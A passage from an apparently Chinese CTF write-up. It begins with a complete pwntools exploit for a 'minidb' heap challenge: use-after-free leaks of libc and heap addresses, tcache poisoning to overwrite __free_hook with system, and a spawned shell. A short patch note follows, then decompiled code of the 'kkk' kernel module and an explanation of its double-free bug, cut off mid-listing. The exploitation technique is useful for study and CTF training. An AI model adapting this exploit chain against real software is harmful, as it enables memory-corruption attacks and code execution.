class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p = process(&#x27;./minidb&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the new value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;666&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_db</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>:<span class="hljs-built_in">int</span>, name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the type of database: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_db_name</span>(<span class="hljs-params">orig_name:<span class="hljs-built_in">bytes</span>, new_name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(orig_name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the new name for database: &quot;</span>)<br>    p.sendline(new_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># pre heap fengshui </span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        add_kv(i, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    exit_db()<br><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br><br>    exit_db()<br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br>    add_kv(<span class="hljs-number">1919810</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    delete_kv(<span class="hljs-number">1919810</span>)<br><br>    exit_db()<br><br>    delete_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>)) <span class="hljs-comment"># reget 1919810</span><br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    update_kv(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">8</span>)) <span class="hljs-comment"># db-&gt;name is 114514 now</span><br><br>    <span class="hljs-comment"># fullfill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete_kv(<span class="hljs-number">1919810</span> + i)<br><br>    <span class="hljs-comment"># get an UAF unsorted chunk and leak libc</span><br>    delete_kv(<span class="hljs-number">114514</span>)<br>    exit_db()<br>    list_db()<br><br>    libc_leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    main_arena = libc_leak - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&quot;Get libc addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_leak))<br>    log.success(<span class="hljs-string">&quot;Libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># reget the victim</span><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br><br>    <span class="hljs-comment"># free the victim and leak heap base</span><br>    delete_kv(<span class="hljs-number">1919810</span> + <span class="hljs-number">6</span>)<br>    delete_kv(<span class="hljs-number">114514</span>)<br><br>    exit_db()<br>    list_db()<br>    p.recvuntil(<span class="hljs-string">b&#x27;\tarttnba3\n\t&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak - <span class="hljs-number">0x1640</span><br>    log.info(<span class="hljs-string">&quot;Get heap addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    log.success(<span class="hljs-string">&quot;Heap base: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    <span class="hljs-comment"># hijack the tcache list to __free_hook</span><br>    update_db_name(p64(heap_leak)[:<span class="hljs-number">6</span>], <br>                   p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x88</span>) \<br>                   + <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>))<br><br>    <span class="hljs-comment"># overwrite __free_hook by dbname</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>))<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) \<br>                 + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>    <span class="hljs-comment"># trigger</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br>    delete_db(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br><br></code></pre></td></tr></table></figure><p>运行即可 get shell</p><p><img src="https://s2.loli.net/2023/07/14/oxBjs2IzF83JucH.png" alt="image.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>直接把多余的漏洞指令给 nop 掉即可</p><p><img src="https://s2.loli.net/2023/07/07/SRjxs1QnDpKFowk.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/07/XiDM3odbWxmpTRe.png" alt="image.png"></p><h1 id="0x02-kkk（困难）"><a href="#0x02-kkk（困难）" class="headerlink" title="0x02. kkk（困难）"></a>0x02. kkk（困难）</h1><p>不知道为啥没人 <code>break</code> 的一道题目，漏洞本身利用的空间也挺大的，而且都有好几个队伍 <code>fix</code> 成功了，怎么最后解开的队伍数量还是 0 呢  :（</p><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目提供了一个 <code>kkk.ko</code>，惯例拖入 IDA，其 <code>ioctl()</code> 只提供了两个功能——读取 <code>k2u</code> 队列与写入 <code>u2k</code> 队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  mutex_lock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x1919810</span> )<br>  &#123;<br>    kkk_write_u2k_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x114514</span> )<br>  &#123;<br>    kkk_read_k2u_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(&amp;unk_143E);<br>  &#125;<br>  mutex_unlock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>写入 <code>u2k</code> 队列首先会判断队列是否已满，之后分配一个 object 并将数据从用户空间拷贝到内核空间，这里我们可以看出在队列当中的每个 object 都应当带有一个 <code>header</code> ，在 <code>header</code> 之后才是真正的用户数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_write_u2k_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// r13</span><br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// r15</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// r12</span><br>  __int64 v5; <span class="hljs-comment">// rbx</span><br>  __int64 v7[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-48h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+10h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+18h] [rbp-30h]</span><br><br>  v9 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  v8 = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  mutex_lock(&amp;u2k_lock);<br>  v1 = ((_WORD)u2k_tail + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>  <span class="hljs-keyword">if</span> ( u2k_head != v1 &amp;&amp; !copy_from_user(v7, a1, <span class="hljs-number">24LL</span>) &amp;&amp; v8 &lt;= <span class="hljs-number">0xFFFFFFFFFFFFFFE7</span>LL )<br>  &#123;<br>    v2 = _kmalloc(v8 + <span class="hljs-number">24</span>, <span class="hljs-number">4197568LL</span>);<br>    <span class="hljs-keyword">if</span> ( v2 )<br>    &#123;<br>      v3 = v2;<br>      v4 = v8 + <span class="hljs-number">24</span>;<br>      <span class="hljs-keyword">if</span> ( ((v8 + <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2, v8 + <span class="hljs-number">24</span>, <span class="hljs-number">0LL</span>);<br>      <span class="hljs-keyword">if</span> ( copy_from_user(v3, a1, v4) )<br>      &#123;<br>        kfree(v3);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v5 = u2k_tail;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)u2k_tail &gt;= <span class="hljs-number">0x1000</span> )<br>          _ubsan_handle_out_of_bounds(&amp;off_24B0, u2k_tail);<br>        u2k_queue[v5] = v3;<br>        u2k_tail = v1;<br>      &#125;<br>    &#125;<br>  &#125;<br>  mutex_unlock(&amp;u2k_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>读取 <code>k2u</code> 队列则是直接将队列中的 object 整个拷贝回用户空间，注意到这里存在一个漏洞：<strong>即使数据拷贝失败也会释放 object，但该 object 不会出队列，从而导致我们可以使得一个 object 被多次 free</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_read_k2u_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// rbx</span><br>  __int64 v2; <span class="hljs-comment">// rbx</span><br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  __int64 v4; <span class="hljs-comment">// r14</span><br>  __int16 v5; <span class="hljs-comment">// ax</span><br><br>  mutex_lock(&amp;k2u_lock);<br>  v1 = k2u_head;<br>  <span class="hljs-keyword">if</span> ( k2u_head != k2u_tail )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>      _ubsan_handle_out_of_bounds(&amp;off_24D0, k2u_head);<br>    v2 = k2u_queue[v1];<br>    <span class="hljs-keyword">if</span> ( !copy_to_user(a1, v2, <span class="hljs-number">24LL</span>) )<br>    &#123;<br>      v3 = *(_QWORD *)(v2 + <span class="hljs-number">16</span>);<br>      <span class="hljs-keyword">if</span> ( (v3 &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2 + <span class="hljs-number">24</span>, *(_QWORD *)(v2 + <span class="hljs-number">16</span>), <span class="hljs-number">1LL</span>);<br>      <span class="hljs-keyword">if</span> ( !copy_to_user(a1 + <span class="hljs-number">24</span>, v2 + <span class="hljs-number">24</span>, v3) )<br>      &#123;<br>        v4 = k2u_head;<br>        v5 = k2u_head;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>        &#123;<br>          _ubsan_handle_out_of_bounds(&amp;off_24F0, k2u_head);<br>          v5 = k2u_head;<br>        &#125;<br>        k2u_queue[v4] = <span class="hljs-number">0LL</span>;<br>        k2u_head = (v5 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>      &#125;<br>    &#125;<br>    kfree(v2);<br>  &#125;<br>  mutex_unlock(&amp;k2u_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>那么读取 <code>u2k</code> 队列与写入 <code>k2u</code> 队列的功能在哪完成呢？让我们将目光放回初始化函数，在完成设备文件注册后其会启动一个 CPU 核心数个内核线程（本题为 1 个），该线程会执行函数 <code>kkk_msg_handler_fn()</code>，这个函数比较长我们一步一步来分析</p><blockquote><p>本来想弄多个内核线程的，但是这样难度好像又太高了点（笑），所以只弄了一个</p></blockquote><p>该函数整体是一个大循环，开头有个小循环内部会循环轮询 <code>u2k</code> 队列，若不为空则从中取出一个 object，若 object 开头的字段不为 <code>1</code> 则释放掉并重新继续循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">kkk_msg_handler_fn</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// r14</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// rdi</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// r15</span><br>  __int64 v5; <span class="hljs-comment">// rax</span><br>  __int64 v6; <span class="hljs-comment">// rax</span><br>  __int16 v7; <span class="hljs-comment">// cx</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// rdi</span><br>  __int64 v9; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> *v10; <span class="hljs-comment">// rdi</span><br>  __int64 v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  v11[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_read_u2k_queue(v11) )<br>        msleep(<span class="hljs-number">1000LL</span>);<br>      v0 = v11[<span class="hljs-number">0</span>];<br>      <span class="hljs-keyword">if</span> ( *(_WORD *)v11[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">break</span>;<br>      printk(&amp;unk_1743);<br>LABEL_24:<br>      msg_free(v11[<span class="hljs-number">0</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>接下来是一个巨大的 switch，根据从 <code>u2k</code> 队列中取出的 object 指定字段的值进行相应处理，主要实现了 <code>tea</code> 加密、<code>tea</code> 解密、<code>md5</code> 哈希算法三种功能</p><p>在完成请求后会根据选项不同与执行结果不同选择是否将该 object 重用并写入 <code>k2u</code> 队列或是分配一个新的 <code>object</code> 写入 <code>k2u</code> 队列，对于 <code>md5</code> 哈希请求而言总会分配一个新的 object，而 <code>tea</code> 加解密请求则会，作为请求执行的结果返回给用户：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">switch</span> ( v1 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        v5 = msg_alloc(<span class="hljs-number">16LL</span>);<br>        <span class="hljs-keyword">if</span> ( v5 )<br>        &#123;<br>          v4 = v5;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_crypto_hash_md5((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">24</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>)) )<br>          &#123;<br>            printk(&amp;unk_17E1);<br>            v7 = <span class="hljs-number">2</span>;<br>            v6 = <span class="hljs-number">0LL</span>;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            v6 = <span class="hljs-number">16LL</span>;<br>            v7 = <span class="hljs-number">1</span>;<br>          &#125;<br>          *(_DWORD *)v4 = <span class="hljs-number">196610</span>;<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = v7;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_23;<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_32;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        v8 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">0x18</span> || (v8 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_17AD;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v9 = msg_alloc(v8 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v9 )<br>        &#123;<br>LABEL_27:<br>          v10 = 